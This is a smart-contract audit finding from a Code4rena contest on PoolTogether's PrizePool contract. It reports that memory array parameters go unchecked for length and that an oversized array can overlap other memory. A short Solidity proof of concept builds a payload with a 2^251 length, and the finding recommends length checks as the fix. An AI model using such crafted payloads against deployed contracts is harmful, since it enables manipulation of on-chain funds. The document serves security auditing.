## Tags

- bug
- 1 (Low Risk)
- sponsor confirmed

# [Using memory[] parameter without checking its length](https://github.com/code-423n4/2021-06-pooltogether-findings/issues/75) 

# Handle

JMukesh


# Vulnerability details

## Impact
Using memory array parameters (e.g. uint[] memory) as function parameters can be tricky in Solidity, because an attack is possible with a very large array which will overlap with other parts of the memory.

## Proof of Concept

https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/PrizePool.sol#L219

https://github.com/code-423n4/2021-06-pooltogether/blob/85f8d044e7e46b7a3c64465dcd5dffa9d70e4a3e/contracts/PrizePool.sol#L639


This an example to show the exploit:

// based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol

pragma solidity ^0.4.24; // only works with low solidity version

contract test{
    struct Overlap {
        uint field0;
    }
    event log(uint);

  function mint(uint[] memory amounts) public  returns (uint) {   // this can be in any solidity version
       Overlap memory v;
       v.field0 = 1234;
       emit log(amounts[0]); // would expect to be 0 however is 1234
       return 1;
     }

  function go() public { // this part requires the low solidity version
      uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251
      bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x);
      bool success=address(this).call(payload);
  }
}




## Tools Used

manual analysis

## Recommended Mitigation Steps
check the array length before using it

